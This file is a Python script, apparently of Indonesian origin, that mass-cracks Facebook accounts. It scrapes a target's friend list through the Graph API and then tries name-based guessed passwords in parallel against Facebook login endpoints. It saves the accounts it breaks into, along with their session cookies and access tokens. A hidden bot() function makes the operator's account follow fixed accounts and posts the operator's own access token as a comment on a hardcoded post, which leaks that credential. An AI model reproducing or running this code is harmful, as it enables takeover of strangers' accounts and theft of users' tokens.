#!/usr/bin/python3
# coding=utf-8
# author : Maulana ID
#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Fall Xavier

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")

### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
url = "https://mbasic.facebook.com"
ses = requests.Session()
id = []
cp = []
ok = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
headerz = random.choice([
	'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
	'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
])

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
                                                                                                
                                                                                             
KKKKKKKKK    KKKKKKKMMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   FFFFFFFFFFFFFFFFFFFFFF
K:::::::K    K:::::KM:::::::M             M:::::::MB::::::::::::::::B  F::::::::::::::::::::F
K:::::::K    K:::::KM::::::::M           M::::::::MB::::::BBBBBB:::::B F::::::::::::::::::::F
K:::::::K   K::::::KM:::::::::M         M:::::::::MBB:::::B     B:::::BFF::::::FFFFFFFFF::::F
KK::::::K  K:::::KKKM::::::::::M       M::::::::::M  B::::B     B:::::B  F:::::F       FFFFFF
  K:::::K K:::::K   M:::::::::::M     M:::::::::::M  B::::B     B:::::B  F:::::F             
  K::::::K:::::K    M:::::::M::::M   M::::M:::::::M  B::::BBBBBB:::::B   F::::::FFFFFFFFFF   
  K:::::::::::K     M::::::M M::::M M::::M M::::::M  B:::::::::::::BB    F:::::::::::::::F   
  K:::::::::::K     M::::::M  M::::M::::M  M::::::M  B::::BBBBBB:::::B   F:::::::::::::::F   
  K::::::K:::::K    M::::::M   M:::::::M   M::::::M  B::::B     B:::::B  F::::::FFFFFFFFFF   
  K:::::K K:::::K   M::::::M    M:::::M    M::::::M  B::::B     B:::::B  F:::::F             
KK::::::K  K:::::KKKM::::::M     MMMMM     M::::::M  B::::B     B:::::B  F:::::F             
K:::::::K   K::::::KM::::::M               M::::::MBB:::::BBBBBB::::::BFF:::::::FF           
K:::::::K    K:::::KM::::::M               M::::::MB:::::::::::::::::B F::::::::FF           
K:::::::K    K:::::KM::::::M               M::::::MB::::::::::::::::B  F::::::::FF           
KKKKKKKKK    KKKKKKKMMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   FFFFFFFFFFF                                                                                                                                                                                                                                                                                                                                                                                                                                    
                      """%(N))
   
### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print('──────────────────────────────────────────')
		token = input(' [?] token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        uid = a['id']
        ttl = a['birthday']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print('──────────────────────────────────────────')
    print(" Nama        : %s"%(nama))
    print(" ID          : %s"%(uid))
    print(" Tgl. Lahir  : %s"%(ttl))
    print('──────────────────────────────────────────')
    print(" [1]. crack teman/publik")
    print(" [2]. lihat akun hasil crack")
    print(" [3]. logout (hapus token)")
    print('──────────────────────────────────────────')
    asw = input(" [?] pilih menu : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "2":
    	cekhasil()
    elif asw == "3":
    	os.system('rm -f token.txt')
    	print('──────────────────────────────────────────')
    	jalan(" [✓] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih jawaban dengan bener ! ")
    	menu() 
 
### CEK HASIL ### 
def cekhasil():
	print('──────────────────────────────────────────')
	print(' [1]. lihat hasil crack OK ')
	print(' [2]. lihat hasil crack CP ')
	print('──────────────────────────────────────────')
	anjg = input(' [?] pilih : ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print('──────────────────────────────────────────')
		for file in dirs:
			print(" [*] "+file)
		try:
			print('──────────────────────────────────────────')
			file = input(" [?] file : ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		print('──────────────────────────────────────────')
		os.system("cat OK/%s"%(file))
		print('──────────────────────────────────────────')
		input(" [*] tekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print('──────────────────────────────────────────')
		for file in dirs:
			print(" [*] "+file)
		try:
			print('──────────────────────────────────────────')
			file = input(" [?] file : ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		print('──────────────────────────────────────────')
		os.system("cat CP/%s"%(file))
		print('──────────────────────────────────────────')
		input(" [*] tekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()

### DUMP PUBLIK ###
def publik():
	try:
		token=open("token.txt","r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	idt=input(" [?] masukkan id : ")
	if idt in[""]:
		menu()
	print('──────────────────────────────────────────')
	print(" [1] crack all id   [2] crack id old")
	ask=input(" [?] pilih : ")
	if ask in[""]:
		menu()
	elif ask in["1"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
		print(" [+] total id : %s"%(len(id)))
		atursandi()
	elif ask in["2"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(uid+"<=>"+nama)
				elif i['id'][:10] in ['1000000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:9] in ['100000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:8] in ['10000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
					id.append(uid+"<=>"+nama)
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
		print(" [+] total id : %s"%(len(id)))
		atursandi()
		
### ATUR SANDI ###
def atursandi():
	print('──────────────────────────────────────────')
	print(" [1] otomatis  [2] manual  [3] gabungkan")
	ask=input(" [?] pilih : ")
	if ask in[""]:
		menu()
	elif ask in["1"]:
		otomatis()
	elif ask in["2"]:
		manual()
	elif ask in["3"]:
		gabungkan()
	else:
		exit()

### OTOMATIS ###
def otomatis():
	print('──────────────────────────────────────────')
	print(" [1]. metode API")
	print(" [2]. metode mbasic")
	print(" [3]. metode mobile")
	print('──────────────────────────────────────────')
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
		
### MANUAL ###
def manual():
	print('──────────────────────────────────────────')
	print(" [!] gunakan , (koma) sebagai pemisah")
	pwek=input(' [?] buat kata sandi : ')
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('──────────────────────────────────────────')
	print(" [1]. metode API")
	print(" [2]. method mbasic")
	print(" [3]. method mobile")
	print('──────────────────────────────────────────')
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
		
### GABUNGAN ###
def gabungkan():
	print('──────────────────────────────────────────')
	print(" [!] sandi bawaan nama123,1234,12345")
	print(" [!] gunakan , (koma) sebagai pemisah")
	pwek=input(' [?] sandi gabungan : ')
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('──────────────────────────────────────────')
	print(" [1]. method API")
	print(" [2]. method mbasic")
	print(" [3]. method mobile")
	print('──────────────────────────────────────────')
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' [+] hasil OK disimpan ke -> ok.txt')
		print(' [+] hasil CP disimpan ke -> cp.txt')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	
### CRACK API ###
def api(uid, pwx):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("token.txt", "r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r %s[CP] %s|%s        "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

### CRACK MBASIC M FB ###
def crack(uid, pwx, host, **kwargs):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r %s[OK] %s|%s|%s"%(H,uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r %s[CP] %s|%s        "%(K,uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")

if __name__=='__main__':
	os.system('git pull')
	menu()
